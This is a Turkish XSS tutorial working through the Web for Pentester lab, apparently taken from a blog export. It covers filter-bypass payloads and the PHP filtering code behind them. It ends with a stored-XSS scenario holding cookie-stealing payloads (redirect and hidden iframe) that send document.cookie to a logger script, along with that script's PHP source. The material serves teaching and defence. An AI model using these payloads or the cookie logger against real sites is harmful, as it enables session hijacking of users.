sanallaştırma yazılımlarını kullanarak çalıştıracağız. Ve bu sanal makinenin ip adresini kendi tarayıcımıza yazdığımızda aşağıdaki ekranla karşılaşırsak nema problema. Googledan web for pentester diye aratırsanız sayfalarca sonuç çıkacaktır. Xss zafiyeti araken körü körüne random payloadlar yazmak yerine, ilgili parametreye doğrudan bütün özel karakterleri (<,',<,\") yazıp hangilerinin filtrelendiğini görebiliriz, ve buna dayanarak daha makul ve yerinde payladlar yazarak zamandan tasaruf edebiliriz. Şimdi XSS kategorisindeki caseleri çözmeye başlayalım. Example 1 Url'de http://192.168.46.128/xss/example1.php?name= gördüğünüz üzere example1.php dosyası, get metodu ile name parametresine aldığı değeri ekrana basılıyor. Yukarıdaki trickte bahsettiğimiz gibi özel karakterlerimizi yazarak sayfanın kaynak kodunda oluşan değişimi gözlemleyip ona göre payload geliştirelim. Gördüğünüz üzere en ufak bi filtreleme yok. Yazdığımız bütün karakterler ekrana yansıdı. İlk örnek olduğu için en temel xss payloadımız olan <script>alert(1)</script> yazalım. Alerti başarılı bir şekilde aldık. Şimdi kaynak koduna bakıp 2. Örneğe geçelim. Kaynak koddan gördüğünüz gibi kullanıcıdan gelen veri hiç süzülmeden doğrudan ekrana basılmaktadır. Bundan daha büyük hata olabilir mi? Example 2 Url yapısı ilk casemiz ile aynı. Ancak ilk örnekte kullandığımız payloadı burda denediğimizde text olarak \"Hello alert(1)\" çıktısını alıyoruz. Burda olan işlemden şu sonucu çıkarabiliriz; yazdığımız javascript kodu çalışmadı. Çünkü ekranda alert(1) ifadesi text olarak göründü bunun anlamı ise geliştirici script keywordunü filtrelemiş. Peki bunu nasıl bypass ederiz? En temel şekilde büyük-küçük yazarız. Payloadımız: <ScRipt>alert(1)</sCriPT> Kaynak kodu incelediğimizde, get metoduyla name parametresine verilen değer name değişkenine atanmıştır ve preg_replace() fonksiyonu sayesinde name değişkeninde eğer <script> veya </script> kelimeleri geçiyor ise bunları silmektedir/değiştirmektedir. Example 3 Url adresimizdeki name parametresi dikkatimizi çekmiş olmalı. Özel karakterlerimizi kullanıp herhangi bir filtrelenme var mı diye kontrol edelim. Sayfanın kaynak koduna baktığımızda özel karakterlerimizin filtrelenmediğini görürüz. Ve sazan gibi en temel payloadımız olan <script>alert(1) </script> yazıyoruz. Hopaaa! Script keywordu engellenmiş :/ script keywordunu büyük-küçük yazmamıza rağmen işe yaramayacaktır. O zaman ne yapabiliriz? Okumayı burda bırakıp biraz düşünün :) Cevap, iç içe yazmak. Yani <scr<script>ipt>alert(1)</scr</script>ipt> . Bu payload arkada nasıl işleyecek peki? Name parametesine yazacağımız payloadlarda geçen <script> keywordlerini sileceği için geriye yine <script> keywordu kalacaktır. Ve payloadımız başarıyla çalışacaktır. Yani uzun lafın kısası payloadımız: <scri<script>pt>alert(1)</scri</script>pt> Kaynak kodu incelediğimizde gördüğümüz gibi script kelimesi temizleniyor. Regex de /i ifadesi büyük-küçük harflere karşı duyarsızlığı ifade ediyor. Yani siz aLeRt veya alert de yazsanız farketmeyecek ikisinide engelleyecektir. Example 4 Örnek4 de ise şimdiye kadar denediğimiz 3 payloadın bu örnekte çalışmadığını göreceğiz. Payloadlarımızı yazıp html kaynak kodlarına baktığımızda aşağıda bulunan resimdeki gibi bir sonuç aldığımızı görüyoruz. Sayfanın kaynak koduna baktığımızda sadece \"error\" ibaresini göreceğiz. Büyük olasılıkla geliştirici name parametresine verilen değerde script veya alert gibi özel kelimeleri filtrelemiştir. Ve bu kelimeler kullanıldıldığı taktirde die() veya error() gibi fonksiyonlarla çalışan betiği sonlandırır. Bu noktada bizim yazacağımız kod bu kelime(ler)i içermeyen bir payload yazmaktır. Bunu da html taglarındaki attributleri kullanarak yapacağız. Yani bir html etiketinin atributtune js kodu yazacağız. Örneğin şöyle; <img src=x onerror=alert(1)> gördüğünüz üzere hiç script kelimesini kullanmadık. Bu payloadda src adında bir imaj yüklemeye çalıştık eğer yükleyemez, bir hata meydana gelir ise onerror attributune vereceğimiz alert ile ekrana 1 yazacak. Payloadımızı denediğimizde çalışacağını göreceğiz. Alternatif olarak <svg src=x onerror=alert(1)> çalışacaktır hatta benzer yapıya sahip başka html etiketleri de çalışacaktır. Sayfanın kaynak koduna bakıldığında payloadımızın html syntaxına uygun olduğu görülecektir. Bundan dolayı sorunsuz bir şekilde çalıştı. Yazacağımız bütün payloadlarda bunu dikkate almalıyız. İlgili dilin syntaxına uygun olarak yazılacak ki payload çalışabilsin. Şimdi kaynak kodu inceleyelim. Evet gördüğünüz gibi aynen düşündüğümüz gibi Regex ifadesi kullanılarak script kelimesinin name parametresine verilmesi durumunda die komutu ile sayfanın geri kalanını çalıştırmayacak şekilde error verdirilmiş. Example 5 Artık tahmin edeceğiniz gibi bir sonraki örnekte şimdiye kadar denediğimiz hiçbir payload çalışmayacaktır. Normal bir payload yazdığımızda önceki örnekte olduğu gibi error ifadesini ekrana basıyor. Muhtemelen yine özel keywordlerden biri engellenmiştir. Şu ana kadar hep alert() ile ekrana birşeyler basmaya çalıştık ama tek kod bu değil. Benim bildiğim 2 komut daha var. Birincisi ekrana hem alert gibi pencere açıp aynı zamanda kullanıcıdan girdi alan prompt() , bir de kullanıcıdan onay isteyen confirm() kodu. Bunlar dışında başka popup boxlar da olabilir, benim bildiğim bu üçü. O zaman bu durumda payloadımız nasıl olacak? <script>prompt(1)</script> veya <script>confirm(1)</script> her iki payload da sorunsuz çalışacaktır. Ctrl+u ile sayfanın kaynak kodlarına bakalım. Aşağıda gördüğünüz üzere yazdığımız payload script tagleri arasında ilgili yere yazılmış. Burda önemli olan nokta yazdığımız payload javascript syntaxını bozmadan yazılmış olmasıdır. Zaten syntaxı bozarsanız payloadınız çalışmayacaktır. Bu nedenle xss ararken deneme amaçlı yazdığınız payloadları sayfanın kaynak kodundaki değişimlerden takip ederek daha isabetli atışlar yapabilirsinizi. Şimdi php tarafındaki kaynak kodları görelim; preg_match() fonksiyonunun yaptığı şudur; Eğer birinci parametredeki değer, ikinci parametredeki veri içerisinde geçiyor ise true döner, geçmiyor ise false döner. Bu örnekte ilk parametremiz alert kelimesi oluyor ve \\i ifadesinden dolayı (harf duyarlılığı olmaksızın) alert kelimesinin, get metoduyla alınan name parametresindeki değer içerisinde geçmesi durumunda fonksiyonumuz true dönecektir. Example 6 Öncellikle name parametresine \"<'> şu 4 özel karakteri girelim bakalım ne olacak. Sayfanın kaynak kodundan anlaşılacağı üzere herhangi bir karakter filtrelenmesi söz konusu değil. Ctrl+u yaparak kaynak koda baktığımızda name parametresine girdiğimiz her değer script tagleri arasında bulunan a değişkenine atanıyor. Bu durumda nasıl bir payload geliştirebiliriz? Düşünelim biraz… Öncellikle açılmış olan script tagini kapatalım. Daha sonra kendimiz bir script tagi açıp alert ile ekrana uyarıyı bastıktan sonra tagi kapatalım. Bazılarınız kapatmaya gerek yok zaten kendisi kapatmış diyebilir haklı olaraktan ancak sayfanın kaynak koduna baktığınızda \" ve ; işaretleri bize sorun oluşturacağından dolayı kendimiz kapatmamız gerekecektir. Uzun lafın kısası payloadımız; </script><script>alert(1)</script> şeklinde olacaktır. Bu örneğin kaynak koduna bakmaya gerek yok çünkü herhangi server side (php) tarafından bir filtreleme uygulanmamıştır. Sadece js kullanılmıştır. Sayfanın kaynak koduna bakıp ne tür bir filtreleme kullanıldığını görebilirsiniz. Example7 Sıra geldi 7. Örneğimize bu örnek extrem bir örnek olabilir. Bu örneğimizde diğerlerinden farklı olarak önce kaynak koduna bakıp ona göre payload geliştireceğiz. Bu noktada; E biz nerden bilelim sitenin kaynak kodlarını diyebilirsiniz? (Demeyin!) Şöyle bir durum var. Bir çok açık kaynak template, hazır scriptler, cms ler var. Eğer hedefimiz bu public olan bir sistem/script kullanıyorsa o zaman kaynak kodlarını indirip inceleyip ona göre payload geliştirebilirsiniz. Durum böyle olduğu için sadece tek bir sitede değil ilgili scripti kullanan her sitede payloadınız çalışacaktır. Php de güvenlik adına çok önemli olan fonksiyonlardan biri de htmlentities() fonksiyonudur. Bu fonksiyon kendisine verilen her değerin içinde bulunan (<, \", >) ifadelerini sırasıyla (&lt; , &quot; , &gt;) ifadelerine dönüştürür. Hatta 2. parametre olarak ENT_QUOTES değerini verirseniz ‘ (tek tırnağı da) engellemiş olursunuz. Tek tırnak ise &#039; formatına dönüşür. Yani htmlentities($str, ENT_QUOTES) şeklinde kullanırsanız (<, ', \", >) bu 4 karakteri encoding ettiğinizden artık özel anlamlarını yitireceğinden bu karakterleri barındıran zararlı kodlar çalışmayacaktır. Bu saldırganın işini çok ama çok zorlaştırır. XSS ile veri aldığımız inputlardaki değeri bu fonksiyondan geçirirsek çok büyük bir olasılıkla xss saldırısından korunmuş olacağız. Bu nedenle bu fonksiyon geliştiriciler için bi' nimettir. Ancak bazı nadir vardır ki bu fonksiyon kullanılmasına rağman xss zaafiyeti meydana yine meydana gelmektedir. Sıradaki örneğimizde işte bu nadir olan durumlardan birini göreceğiz. Şimdi bu kadar bilgiyi neden paylaştım? Çünkü sıradaki challangemızda inputtan alınan değer bu fonksiyondan geçmiştir. Ancak tek tırnağı da engellemek için opsiyonel olarak 2. Parametre de alabileceğini söylemiştik bu challangemızda 2. Parametre belirtilmemiştir. Bu da şu anlama gelmektedir; ‘ tırnak kullanabiliriz. Ve bir çok geliştirici bu fonksiyonu kullandığı zaman 2. Parametreyi belirtmez bu da saldırganın işini çok kolaylaştırmaktadır. Asıl mevzumuza gelelim şimdi. Name parametresine özel karakterlerimizi girip sayfanın kaynak koduna bakıp meydana gelen değişimi gözlemleyelim. Gördüğünüz gibi sırasıyla < , > , \" karakterlerimiz; &alt; , &gt; , &quot; karakterlerine dönüştürülerek güvenlik sağlanmaya çalışılmış AMA dikkat ettiyseniz ‘(tek tırnak) karakteri olduğu gibi kaldı. Bu bizim için çok önemli! Bir diğer önemli olan nokta ise; name parametresine yazdığımız değerin zaten <script> tagleri arasında işlenecek olmasıdır. Böylelikle <, > karakterlerini kullanmamıza gerek kalmayacak. Öte yandan sayfanın kaynak koduna baktığımızda yazdığımız değerin JS kısmında a diye bir değişkende ‘(tek tırnaklar) arasında tutulduğunu göreceğiz. Şimdi şöyle düşünelim ekrana alert vermek için öncellikle js tarafında olan a değişkeninin alacağı değerin ‘ işaretini kapatalım. Daha sonra ;(noktalı virgül) karakterimizi yazarak ilgili kod satırını sonlandıralım. Şimdi alert ifademizi yazabiliriz. Zaten JS kodunda önceden var olan sondaki ‘ işaretinden kaçmak içinde // karakterlerini kullanarak pasif ediyor. Yani şöyle bir şey oldu; Payload: musana';alert(1)// Zaten payloadımızı js de ilgili yere yazdığımızda herhangi bir syntax hatasının olmadığını göreceğiz. Bir sonraki örneğimizde bizi bir input karşılıyor ancak bizim input ile işimiz olmayacak. Sayfanın kaynak kodlarına baktığımızda form etikemizin action niteliğinde sayfamızın olduğunu göreceğiz. Bu nedenle sayfamızın url yapısını mıncıklayacağız biraz. Çünkü url kısmına ne yazılır ise form etiketnin action niteliğinin değeri olarak atanıyor. O halde aşağıdaki payload çalışacaktır. /\" onmouseover=\"alert(1) /\" ile action niteliğimizin değerini kapadık. Daha sonra onmouseover adında bir js eventı tanımladık ancak payloadın sonuna \"(çift tırnak) atmadık çünkü tırnağı kendisi tamamlayacak. Kaynak koda baktığımızda payloadımızın cuk diye oturduğunu görüyoruz zaten. Aşağıdaki resimde ise php kaynak kodlarını görüyoruz. Htmlentities fonksiyonu kullanılarak input'tan gelen zararlı karakterler filtrelenmiş. Ancak form etiketinin action niteliğinde PHP_SELF kullanılmış. Yani formdan gönderilecek herhangi bir very aynı sayfada işlenecek. Bizde tam olarak bu kısmı kullanarak payload geliştirdik. BONUS(Siz Çözün): Şimdiye kadar gördüğümüz örnek caselere dayanarak bu örneği çözmenizi bekliyorum. Çünkü yukarıdakileri okuyup anladıysanız biraz kafa yorarak rahatlıkla zafiyeti ortaya çıkaracak payloadı yazabilirsiniz. Payloadları yorum kısmına bekliyorum :) <?php $request = $_REQUEST [ 'istek' ]; $filtrele = array ( '<' , '>' , '\"' ); # htmlentities() fonksiyonunun default kullanımı # 3. ve 4. satırdaki işlemleri icra eder. $request = str_replace ( $filtrele , \"\" , $request ); ?> <!DOCTYPE html> <html lang=\"tr\"> <head> <meta charset=\"UTF-8\"> <title>XSS</title> </head> <body> <script> var value; function setValue(){ if(false){ value = <?php echo $request ?> } } </script> </body> </html> Örnek bir senaryo Şimdiye kadar gördülerimiz ile bir sistemde olan xss zafiyetini ortaya çıkarmak için ne tür/nasıl payloadlar geliştireceğimizi gördük. Peki iyi güzel de bir sitede xss zafiyetinin olması neyi ifade ediyor tam anlamıyla? Neden bu kadar tehlikeli? Bug bounty programlarında neden para veriliyor bu zafiyete? Saldırganlar bu zafiyeti nasıl istismar ediyor? Şimdi bu sorulara uygulamalı cevap verme zamanı. Örnek bir site üzerinde bulacağımız bir xss zafiyeti ile kullanıcın oturum bilgilerinin nasıl ele geçirileceğini göreceğiz. Oracle ve php ile CRUD(Create, Read, Update, Delete) işlemlerini yapan basit bir web uygulaması yazmıştım zamanında örnek senaryamozu bu uygulama üzerinde anlatacağım. Scripti buradan indirebilirsiniz. (Scriptin çalışması için oracle express edition programını kurmanız gerekmektedir.) Burdan sonrasını video ile anlatmak daha iyi olacak sanırım. Yazı zaten yeterince uzun ne siz sıkılın ne ben yorulayım :) Videoda herşeyi açık bir şekilde göstermeye çalıştım. Aklınıza takılan bir yer olursa veya scripti çalıştırmada sorun yaşarsanız yorum bölümüne yazmanız yeterli. Videoda tam olarak ne yaptığımı açık bir şekilde yazmaya çalıştım. Kullandığım kodları paylaşıp kısa bir özet geçtikten bu bölümü sonlandıracağım. Öncellikle hedef sistemin kayıt ol sisteminde stored xss zafiyeti bulduk ve istismar etmek için kayıt ol inputlarından birine aşağıdaki payloadı yazdık. Payloadımız veri tabanına kayıt edildiği için giriş yapan herkes oturum bilgileri ile beraber bizim istediğimiz adrese yönlendirilecekti. <script> location.href=\"http://127.0.0.1/session_log/snif.php?x=\"+document_cookie+\"\\n\" </script> snif.php dosyamızı da paylaşalım. Sadece gelen x parametresindeki değeri log.txt dosyasına yazıyor, that's that. <?php $cookie = $_GET [ 'x' ]; // get metoduyla x parametresinin değerini cookie değişkenine atatık. $f = fopen ( \"log.txt\" , \"a\" ); // log.txt adında bir metin belgesini a izniyle açtık. a: yoksa oluştur, varsa sonuna ekle. fwrite ( $f , $cookie . \" \\n \" ); // log.txt dosyamıza cookie değerlerini yazıyoruz. fclose ( $f ); // Dosyamızı kapattık. ?> Ancak sisteme giriş yapan herkes yönlendirildiği için bu durumun çok anormal olduklarını farkedeceklerdi. Kullanıcılara sezdirmeden yapabilmek için farklı bir payload kullandık. Kullandığımız paylaad; src niteliği saldırganın kullandığı sunucunun adresi olan bir iframe penceresi oluşturuyordu ve style olarak verdiğimiz display:none değeri sayesinde bu iframe sayfada hiçbir şekilde görünmüyordu. Kullanıcıların gözünde herşey normaldi ancak sisteme giriş yapan herkes src niteliğindeki bağlantıya oturum bilgileri ile beraber request gönderiyordu.(Scriptte jquery kütüphanesinin kullanıldığını hatırlatmakta fayda var. jquery kullanılmasaydı aşağıdaki payload çalışmayacaktı. Sadece js kullanılarak da aynı işlem yapılabilir.) <iframe id= \"ifrm\" src= \"x\" style= \"display:none\" ></iframe> <script> $(document).ready(function() { $(\"#ifrm\").attr(\"src\", (\"http://127.0.0.1/session_log/snif.php?x=\"+document.cookie)); }); </script> Böylece sisteme giriş yapan bütün kullanıcıların oturum bilgilerini elde etmiş olduk. Büyük bir sitede böyle bir zafiyet bulduğunuzu düşünsenize ? SON SÖZ Bu yazıda elimden geldiği kadar konuyu temelden alarak anlatmaya çalıştım. Amacım, xss konusunda bu yazıyı okuyanları belli bir seviyeye getirmektir. Bir geliştiricinin kodlayacağı sistemde böyle bir zafiyet bırakmaması için gerekli önlemleri almasını veya bir güvenlik araştırmacısının ezbersiz bir şekilde payload geliştirebilecek bir seviyeye gelmesini hedefledim. Bu yazıyı okuduktan sonra sakın xss zafiyetini tam öğrendim hissine kapılmayın! Bu konu çok geniş ve sürekli güncel tutulması gerekir. Bu zafiyeti istismar etmek için birçok metod ve binlerce xss payloadı mevcut. Ben sadece zafiyetin mantalitesini anlatıp birkaç case ve bir örnek senaryo ile pekiştirmeye çalıştım. Faydası dokunduysa sizlere ne mutlu bana. Google'da xss zafiyetinin ne kadar tehlikeli olduğunu bildiğinden eğitici bir challenge hazırlamış. Belki uğraşmak isteyabilirsiniz. Ayrıca Black Hat Asia '15 konferansında sunulan dom based xss ile ilgili pdf dökümümanını da buradan incelemek isteyebilirsiniz. Bu arada yazıda gördüğünüz eksiklikleri, hatalı bilgileri veya yazım yanlışlarını bildirirseniz minnettar kalırım. Güvenlik konusu sizde bilirsiniz ki sürekli güncel tutulması gerekilen bir konudur. Var olan zafiyetlere yeni teknikler eklenmenin yanında yeni zafiyet türleride geliştirilmektedir/bulunmaktadır. Bu nedenle kendinizi bu konularda güncel tutmanız ve motivasyonunuzu kaybetmememiz temennisiyle. Sağlıcakla kalınız. Not: Bu yazı zamanla güncellenebilir.","tags":"Security","title":"Cross Site Scripting"}]}